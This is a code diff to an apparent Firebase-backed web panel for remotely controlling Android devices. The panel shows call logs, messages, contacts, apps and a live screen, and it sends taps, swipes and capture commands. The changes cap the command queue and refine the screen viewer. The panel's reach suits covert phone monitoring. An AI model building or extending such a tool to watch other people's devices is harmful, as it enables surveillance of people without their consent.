@@ -16,6 +16,8 @@ function formatNowLabel() {
   return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 }
 
+const MAX_COMMAND_QUEUE = 5;
+
 // --- Application State ---
 const state = {
   loadingDevices: true,
@@ -33,9 +35,15 @@ const state = {
   screenData: null,
   screenControl: null,
   screenControlMode: 'tap', // tap | swipe
+  screenSizeMode: 'normal', // mini | normal | max
   castStep: 'idle', // idle | allowed | started | stopped
   lastTapMarker: null,
   swipeTrail: null,
+  markerClearTimer: null,
+  frameSwapToken: 0,
+  frameSwapTimer: null,
+  lastCommittedFrameSrc: '',
+  latestPendingFrameSrc: '',
   screen: 'home', // lock | home | phone | messages | contacts | apps | commands | screen | settings
   screenHistory: [],
   locked: false,
@@ -53,6 +61,7 @@ const state = {
   inspectorTab: 'status',
   rootUnsub: null,
   deviceUnsub: null,
+  trimmingCommands: false,
   toastTimer: null,
 };
 
@@ -240,6 +249,15 @@ function normalizeApps(uidNode) {
     .sort((a, b) => (a.name || '').localeCompare(b.name || ''));
 }
 
+function getSortedCommandIds(rawNode) {
+  return entriesFromRtdb(rawNode)
+    .map((c) => ({
+      id: c.id,
+      createdAt: Number(c.createdAt ?? c.timestamp ?? 0),
+    }))
+    .sort((a, b) => (b.createdAt - a.createdAt) || String(b.id).localeCompare(String(a.id)));
+}
+
 function normalizeCommands(uidNode) {
   const rawNode = uidNode?.commands || uidNode?.command || uidNode?.cmd;
   return entriesFromRtdb(rawNode)
@@ -252,7 +270,8 @@ function normalizeCommands(uidNode) {
       timestampLabel: c.timestampLabel || c.time || 'Recent',
       createdAt: Number(c.createdAt ?? c.timestamp ?? 0),
     }))
-    .sort((a, b) => b.createdAt - a.createdAt);
+    .sort((a, b) => (b.createdAt - a.createdAt) || String(b.id).localeCompare(String(a.id)))
+    .slice(0, MAX_COMMAND_QUEUE);
 }
 
 function detectBase64Mime(b64, fallback = 'image/jpeg') {
@@ -378,6 +397,13 @@ function returnToUidList() {
   state.screenControl = null;
   state.lastTapMarker = null;
   state.swipeTrail = null;
+  if (state.frameSwapTimer) {
+    clearTimeout(state.frameSwapTimer);
+    state.frameSwapTimer = null;
+  }
+  state.frameSwapToken += 1;
+  state.lastCommittedFrameSrc = '';
+  state.latestPendingFrameSrc = '';
   state.shadeOpen = false;
   state.locked = false;
   state.screen = 'home';
@@ -455,9 +481,17 @@ function selectDeviceUid(deviceUid) {
   state.commands = [];
   state.screenData = null;
   state.screenControl = null;
+  state.screenSizeMode = 'normal';
   state.castStep = 'idle';
   state.lastTapMarker = null;
   state.swipeTrail = null;
+  if (state.frameSwapTimer) {
+    clearTimeout(state.frameSwapTimer);
+    state.frameSwapTimer = null;
+  }
+  state.frameSwapToken += 1;
+  state.lastCommittedFrameSrc = '';
+  state.latestPendingFrameSrc = '';
   state.activeThreadPhone = null;
   state.expandedContactId = null;
   state.locked = false;
@@ -481,6 +515,7 @@ function selectDeviceUid(deviceUid) {
         state.commands = normalizeCommands(node);
         state.screenData = normalizeScreenNode(node);
         state.screenControl = normalizeScreenControlNode(node);
+        void trimExcessCommandsOnServer(deviceUid, node);
       } else {
         state.status = null;
         state.calllog = [];
@@ -713,6 +748,47 @@ async function uninstallAppEntry(appItem) {
   }
 }
 
+async function trimExcessCommandsOnServer(uid, uidNode) {
+  if (!uid || !uidNode || state.trimmingCommands) return;
+  const cmdKey = resolveCollectionKey(uidNode, ['commands', 'command', 'cmd'], 'commands');
+  const rawNode = uidNode?.[cmdKey];
+  const sorted = getSortedCommandIds(rawNode);
+  if (sorted.length <= MAX_COMMAND_QUEUE) return;
+
+  const stale = sorted.slice(MAX_COMMAND_QUEUE);
+  const pruneMap = {};
+  for (const item of stale) {
+    pruneMap[item.id] = null;
+  }
+  const cmdPath = devicePath(uid, cmdKey);
+  state.trimmingCommands = true;
+  try {
+    await update(ref(getRtdb(), cmdPath), pruneMap);
+  } catch (err) {
+    handleRtdbError(err, OperationType.DELETE, cmdPath);
+  } finally {
+    state.trimmingCommands = false;
+  }
+}
+
+async function pushCommandCapped(cmdKey, cmdPath, commandPayload, maxKeep = MAX_COMMAND_QUEUE) {
+  const rtdb = getRtdb();
+  const listRef = ref(rtdb, cmdPath);
+  const newKey = push(listRef).key;
+  if (!newKey) return;
+
+  const updatesObj = {
+    [newKey]: commandPayload,
+  };
+  const existingSorted = getSortedCommandIds(state.rawUidNode?.[cmdKey]);
+  const staleEntries = existingSorted.slice(Math.max(0, maxKeep - 1));
+  for (const entry of staleEntries) {
+    updatesObj[entry.id] = null;
+  }
+
+  await update(listRef, updatesObj);
+}
+
 async function sendDeviceCommand({ command, target = 'all', payload = '' }) {
   if (!state.activeUid) return;
   const safeCommand = cleanText(command, 64).toUpperCase().replace(/\s+/g, '_');
@@ -722,7 +798,7 @@ async function sendDeviceCommand({ command, target = 'all', payload = '' }) {
   const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
   const path = devicePath(state.activeUid, cmdKey);
   try {
-    await push(ref(getRtdb(), path), {
+    await pushCommandCapped(cmdKey, path, {
       command: safeCommand,
       target: safeTarget,
       payload: safePayload,
@@ -869,6 +945,7 @@ async function sendScreenTapControl({
       at: now,
     };
     renderTapDotLayer(state.lastTapMarker);
+    scheduleClearScreenOverlay(210);
     showPhoneToast(
       'Tap Sent',
       `(${controlPayload.x}, ${controlPayload.y}) · ${Math.round(controlPayload.xPercent * 100)}%, ${Math.round(controlPayload.yPercent * 100)}%`
@@ -888,6 +965,7 @@ async function sendScreenTapControl({
       at: now,
     };
     renderSwipeTrailLayer(state.swipeTrail);
+    scheduleClearScreenOverlay(210);
     showPhoneToast(
       'Swipe Sent',
       `(${controlPayload.startX},${controlPayload.startY}) → (${controlPayload.endX},${controlPayload.endY})`
@@ -905,7 +983,7 @@ async function sendScreenTapControl({
   try {
     await Promise.all([
       set(ref(rtdb, controlPath), controlPayload),
-      push(ref(rtdb, cmdPath), {
+      pushCommandCapped(cmdKey, cmdPath, {
         command: commandName,
         target: 'screen',
         ...controlPayload,
@@ -1026,7 +1104,7 @@ async function sendCastStepCommand(step) {
   try {
     await Promise.all([
       set(ref(rtdb, controlPath), controlPayload),
-      push(ref(rtdb, cmdPath), {
+      pushCommandCapped(cmdKey, cmdPath, {
         command: commandName,
         target: 'screen',
         ...controlPayload,
@@ -1968,6 +2046,30 @@ function renderAppsScreen() {
   `;
 }
 
+function clearScreenOverlayNow() {
+  if (state.markerClearTimer) {
+    clearTimeout(state.markerClearTimer);
+    state.markerClearTimer = null;
+  }
+  state.lastTapMarker = null;
+  state.swipeTrail = null;
+  const layer = document.getElementById('remote-screen-dot-layer');
+  if (layer) layer.innerHTML = '';
+}
+
+function scheduleClearScreenOverlay(delayMs = 210) {
+  if (state.markerClearTimer) {
+    clearTimeout(state.markerClearTimer);
+  }
+  state.markerClearTimer = setTimeout(() => {
+    state.markerClearTimer = null;
+    state.lastTapMarker = null;
+    state.swipeTrail = null;
+    const layer = document.getElementById('remote-screen-dot-layer');
+    if (layer) layer.innerHTML = '';
+  }, delayMs);
+}
+
 function buildTapDotMarkup(marker) {
   if (!marker) return '';
   const left = `${(marker.xPercent * 100).toFixed(2)}%`;
@@ -1982,12 +2084,11 @@ function buildTapDotMarkup(marker) {
   }
   return `
     <span
-      key="${marker.at || 0}"
       class="tap-dot-ring border-2 border-emerald-400 bg-emerald-400/30"
       style="left:${left};top:${top}"
     ></span>
     <span
-      class="tap-dot-core bg-emerald-400"
+      class="tap-dot-core tap-dot-fade bg-emerald-400"
       style="left:${left};top:${top}"
     ></span>
   `;
@@ -2000,34 +2101,37 @@ function buildSwipeTrailMarkup(trail) {
   const x2 = (trail.endXPercent * 100).toFixed(2);
   const y2 = (trail.endYPercent * 100).toFixed(2);
   const lineColor = trail.active ? '#22d3ee' : '#34d399';
-  const dotClass = trail.active ? 'bg-cyan-400' : 'bg-emerald-400';
+  const dotClass = trail.active ? 'bg-cyan-400' : 'bg-emerald-400 tap-dot-fade';
+  const wrapClass = trail.active ? '' : 'tap-dot-fade';
 
   return `
-    <svg class="absolute inset-0 w-full h-full pointer-events-none" viewBox="0 0 100 100" preserveAspectRatio="none">
-      <line
-        x1="${x1}"
-        y1="${y1}"
-        x2="${x2}"
-        y2="${y2}"
-        stroke="${lineColor}"
-        stroke-width="1.3"
-        stroke-linecap="round"
-        stroke-opacity="0.88"
-      />
-    </svg>
-    <span
-      class="absolute w-3 h-3 rounded-full border-2 border-white/80 bg-slate-900/80 pointer-events-none"
-      style="left:${x1}%;top:${y1}%;transform:translate3d(-50%,-50%,0)"
-    ></span>
-    ${
-      trail.active
-        ? ''
-        : `<span class="tap-dot-ring border-2 border-emerald-400 bg-emerald-400/25" style="left:${x2}%;top:${y2}%"></span>`
-    }
-    <span
-      class="tap-dot-core ${dotClass}"
-      style="left:${x2}%;top:${y2}%"
-    ></span>
+    <div class="absolute inset-0 pointer-events-none ${wrapClass}">
+      <svg class="absolute inset-0 w-full h-full pointer-events-none" viewBox="0 0 100 100" preserveAspectRatio="none">
+        <line
+          x1="${x1}"
+          y1="${y1}"
+          x2="${x2}"
+          y2="${y2}"
+          stroke="${lineColor}"
+          stroke-width="1.3"
+          stroke-linecap="round"
+          stroke-opacity="0.88"
+        />
+      </svg>
+      <span
+        class="absolute w-3 h-3 rounded-full border-2 border-white/80 bg-slate-900/80 pointer-events-none"
+        style="left:${x1}%;top:${y1}%;transform:translate3d(-50%,-50%,0)"
+      ></span>
+      ${
+        trail.active
+          ? ''
+          : `<span class="tap-dot-ring border-2 border-emerald-400 bg-emerald-400/25" style="left:${x2}%;top:${y2}%"></span>`
+      }
+      <span
+        class="tap-dot-core ${dotClass}"
+        style="left:${x2}%;top:${y2}%"
+      ></span>
+    </div>
   `;
 }
 
@@ -2053,25 +2157,107 @@ function renderSwipeTrailLayer(trail) {
   }
 }
 
+async function smoothSwapRemoteScreenImage(nextSrc) {
+  if (!nextSrc || state.lastCommittedFrameSrc === nextSrc || state.latestPendingFrameSrc === nextSrc) return;
+  state.latestPendingFrameSrc = nextSrc;
+  const token = ++state.frameSwapToken;
+
+  const baseImg = document.getElementById('remote-screen-image');
+  const nextImg = document.getElementById('remote-screen-image-next');
+  if (!baseImg) return;
+
+  if (!nextImg) {
+    try {
+      const preloader = new Image();
+      preloader.decoding = 'sync';
+      preloader.src = nextSrc;
+      if (typeof preloader.decode === 'function') await preloader.decode();
+    } catch {
+      // Fallback
+    }
+    if (token !== state.frameSwapToken || state.screen !== 'screen') return;
+    baseImg.src = nextSrc;
+    state.lastCommittedFrameSrc = nextSrc;
+    state.latestPendingFrameSrc = '';
+    return;
+  }
+
+  try {
+    nextImg.decoding = 'sync';
+    nextImg.src = nextSrc;
+    if (typeof nextImg.decode === 'function') {
+      await nextImg.decode();
+    } else if (!nextImg.complete) {
+      await new Promise((resolve) => {
+        nextImg.onload = resolve;
+        nextImg.onerror = resolve;
+      });
+    }
+  } catch {
+    // Fallback to direct swap if decode throws
+  }
+
+  if (token !== state.frameSwapToken || state.screen !== 'screen') return;
+
+  // Instant opaque swap (no transparency ghosting/reflection)
+  nextImg.style.transition = 'none';
+  nextImg.style.visibility = 'visible';
+  nextImg.style.opacity = '1';
+
+  try {
+    baseImg.decoding = 'sync';
+    baseImg.src = nextSrc;
+    if (typeof baseImg.decode === 'function') {
+      await baseImg.decode();
+    }
+  } catch {
+    // Ignore
+  }
+
+  if (token !== state.frameSwapToken || state.screen !== 'screen') return;
+
+  state.lastCommittedFrameSrc = nextSrc;
+  state.latestPendingFrameSrc = '';
+  nextImg.style.visibility = 'hidden';
+  nextImg.style.opacity = '0';
+}
+
 function renderLiveScreenView() {
   const sc = state.screenData;
   const ctrl = state.screenControl;
   const tapMarker = state.lastTapMarker;
   const mode = state.screenControlMode;
+  const sizeMode = state.screenSizeMode || 'normal';
+  const isMini = sizeMode === 'mini';
+  const isMax = sizeMode === 'max';
   const { streaming, allowed, started, stopped } = getEffectiveCastState();
   const updatedText = sc?.updatedAt ? new Date(Number(sc.updatedAt)).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : 'Waiting';
+  state.lastCommittedFrameSrc = sc?.imageSrc || '';
+  state.latestPendingFrameSrc = '';
+
+  const imgHeightClass = isMax
+    ? 'max-h-[calc(100dvh-146px)]'
+    : isMini
+      ? 'max-h-[190px] sm:max-h-[220px]'
+      : 'max-h-[calc(100dvh-318px)]';
+
+  const fallbackHeightClass = isMax
+    ? 'h-[min(640px,calc(100dvh-156px))]'
+    : isMini
+      ? 'h-[190px] sm:h-[220px]'
+      : 'h-[min(370px,calc(100dvh-328px))]';
 
   return `
     <div class="h-full min-h-0 bg-[#040a07] flex flex-col overflow-hidden">
       <div class="shrink-0 bg-[#040a07]/95 backdrop-blur-md px-3 sm:px-4 py-2 border-b border-slate-800 flex items-center justify-between gap-2">
         <div class="min-w-0">
-          <h2 class="text-xs sm:text-sm font-bold text-white truncate">Live Screen Control</h2>
+          <h2 class="text-xs sm:text-sm font-bold text-white truncate">Live Screen</h2>
           <p id="remote-screen-subtitle" class="text-[10px] sm:text-[11px] font-mono-tabular text-slate-400 truncate">${esc(devicePath(state.activeUid, 'screen'))} · ${esc(updatedText)}</p>
         </div>
-        <div class="flex items-center gap-1.5 shrink-0">
+        <div class="flex items-center gap-1 shrink-0">
           <span
             id="remote-screen-live-badge"
-            class="px-2 py-0.5 text-[10px] font-mono-tabular font-semibold rounded-md border ${
+            class="px-1.5 py-0.5 text-[9px] sm:text-[10px] font-mono-tabular font-semibold rounded-md border ${
               streaming
                 ? 'bg-emerald-500/20 border-emerald-400/50 text-emerald-300'
                 : allowed
@@ -2079,17 +2265,45 @@ function renderLiveScreenView() {
                   : 'bg-slate-900 border-slate-700 text-slate-400'
             }"
           >${streaming ? 'LIVE' : allowed ? 'ALLOWED' : 'IDLE'}</span>
+          <div class="inline-flex items-center p-0.5 rounded-lg bg-[#07130e] border border-emerald-500/25 text-[10px] font-mono-tabular">
+            <button
+              type="button"
+              data-screen-size="mini"
+              class="px-1.5 py-0.5 rounded cursor-pointer ${isMini ? 'bg-cyan-600 text-white' : 'text-slate-400 hover:text-white'}"
+              title="Minimize screen preview"
+            >
+              Mini
+            </button>
+            <button
+              type="button"
+              data-screen-size="normal"
+              class="px-1.5 py-0.5 rounded cursor-pointer ${sizeMode === 'normal' ? 'bg-emerald-600 text-white' : 'text-slate-400 hover:text-white'}"
+              title="Default screen size"
+            >
+              Fit
+            </button>
+            <button
+              type="button"
+              data-screen-size="max"
+              class="px-1.5 py-0.5 rounded cursor-pointer ${isMax ? 'bg-emerald-500 text-slate-950 font-bold' : 'text-slate-400 hover:text-white'}"
+              title="Maximize screen full view"
+            >
+              Max
+            </button>
+          </div>
           <button
             type="button"
             data-send-upload-cmd="CAPTURE_SCREEN"
             data-upload-target="screen"
-            class="px-2 sm:px-2.5 py-1 sm:py-1.5 text-[10px] sm:text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 hover:bg-cyan-500/25 rounded-lg cursor-pointer"
+            class="px-2 py-1 text-[10px] sm:text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 hover:bg-cyan-500/25 rounded-lg cursor-pointer"
+            title="Capture screenshot"
           >
-            ↻ Capture
+            ↻
           </button>
         </div>
       </div>
 
+      ${isMax ? '' : `
       <div class="shrink-0 px-3 pt-1.5 pb-1">
         <div class="w-full max-w-md mx-auto grid grid-cols-3 gap-1.5">
           <button
@@ -2154,8 +2368,9 @@ function renderLiveScreenView() {
           </span>
         </div>
       </div>
+      `}
 
-      <div class="flex-1 min-h-0 w-full flex items-center justify-center px-3 py-1 overflow-hidden">
+      <div class="flex-1 min-h-0 w-full flex items-center justify-center ${isMax ? 'px-1.5 py-1' : 'px-3 py-1'} overflow-hidden">
         <div
           id="remote-screen-stage"
           class="relative inline-flex items-center justify-center max-w-full max-h-full bg-[#020504] border-2 border-emerald-500/35 rounded-2xl overflow-hidden shadow-2xl select-none touch-none cursor-crosshair"
@@ -2167,13 +2382,22 @@ function renderLiveScreenView() {
               src="${esc(sc.imageSrc)}"
               alt="Live Android Device Screen"
               draggable="false"
-              decoding="async"
-              class="block max-w-full max-h-[calc(100dvh-318px)] w-auto h-auto object-contain pointer-events-none select-none"
+              decoding="sync"
+              class="block max-w-full ${imgHeightClass} w-auto h-auto object-contain pointer-events-none select-none"
+            />
+            <img
+              id="remote-screen-image-next"
+              alt=""
+              aria-hidden="true"
+              draggable="false"
+              decoding="sync"
+              style="opacity:0;visibility:hidden"
+              class="absolute inset-0 w-full h-full object-contain pointer-events-none select-none"
             />
           ` : `
             <div
               id="remote-screen-fallback"
-              class="h-[min(370px,calc(100dvh-328px))] aspect-[9/19] max-w-full flex flex-col items-center justify-center p-4 text-center space-y-2.5"
+              class="${fallbackHeightClass} aspect-[9/19] max-w-full flex flex-col items-center justify-center p-4 text-center space-y-2.5"
             >
               <div class="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 font-mono-tabular font-bold flex items-center justify-center text-xs">
                 B64
@@ -2193,6 +2417,7 @@ function renderLiveScreenView() {
       </div>
 
       <div class="shrink-0 px-3 pt-1 pb-2 space-y-1.5">
+        ${isMax ? '' : `
         <form id="form-screen-send-msg" class="w-full max-w-md mx-auto flex items-center gap-1.5">
           <input
             id="input-screen-msg"
@@ -2218,6 +2443,7 @@ function renderLiveScreenView() {
             ↵
           </button>
         </form>
+        `}
         <div class="w-full max-w-md mx-auto grid grid-cols-4 gap-1.5 sm:gap-2">
           <button
             type="button"
@@ -2271,7 +2497,7 @@ function renderCommandsScreen() {
       <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2">
         <div>
           <h2 class="text-sm font-bold text-white">List Upload Command Center</h2>
-          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'commands'))} · ${state.commands.length} commands</p>
+          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'commands'))} · ${state.commands.length}/${MAX_COMMAND_QUEUE} commands (max ${MAX_COMMAND_QUEUE})</p>
         </div>
         ${state.commands.length > 0 ? `
           <button type="button" data-action="clear-all-commands" class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-medium bg-red-950/60 border border-red-500/30 text-red-300 hover:bg-red-900/60 rounded-lg cursor-pointer shrink-0">
@@ -2646,8 +2872,8 @@ function renderPhoneScreen() {
     const sameImageMode = existingStage && ((hasSrc && existingImg) || (!hasSrc && existingFallback));
 
     if (sameImageMode && !state.forceScreenRebuild) {
-      if (hasSrc && existingImg && existingImg.getAttribute('src') !== state.screenData.imageSrc) {
-        existingImg.setAttribute('src', state.screenData.imageSrc);
+      if (hasSrc && existingImg && state.lastCommittedFrameSrc !== state.screenData.imageSrc) {
+        void smoothSwapRemoteScreenImage(state.screenData.imageSrc);
       }
       const sub = document.getElementById('remote-screen-subtitle');
       if (sub) {
@@ -3017,6 +3243,13 @@ function wireStaticListeners() {
         return sendCastStepCommand(castStep);
       }
 
+      const screenSize = target.getAttribute('data-screen-size');
+      if (screenSize) {
+        state.screenSizeMode = screenSize === 'mini' || screenSize === 'max' ? screenSize : 'normal';
+        state.forceScreenRebuild = true;
+        return renderPhoneScreen();
+      }
+
       const screenMode = target.getAttribute('data-screen-mode');
       if (screenMode) {
         state.screenControlMode = screenMode === 'swipe' ? 'swipe' : 'tap';
@@ -3176,6 +3409,10 @@ function wireStaticListeners() {
       const targetHeight = state.screenData?.height || img?.naturalHeight || 2400;
       const now = Date.now();
 
+      if (state.markerClearTimer) {
+        clearTimeout(state.markerClearTimer);
+        state.markerClearTimer = null;
+      }
       state.swipeTrail = null;
       state.lastTapMarker = {
         x: Math.round(xPct * targetWidth),
@@ -3282,13 +3519,7 @@ function wireStaticListeners() {
         cancelAnimationFrame(swipeRafId);
         swipeRafId = null;
       }
-      if (state.swipeTrail?.active) {
-        state.swipeTrail = { ...state.swipeTrail, active: false };
-        renderSwipeTrailLayer(state.swipeTrail);
-      } else if (state.lastTapMarker?.pressed) {
-        state.lastTapMarker = { ...state.lastTapMarker, pressed: false };
-        renderTapDotLayer(state.lastTapMarker);
-      }
+      clearScreenOverlayNow();
     });
 
     viewport.addEventListener('input', (e) => {
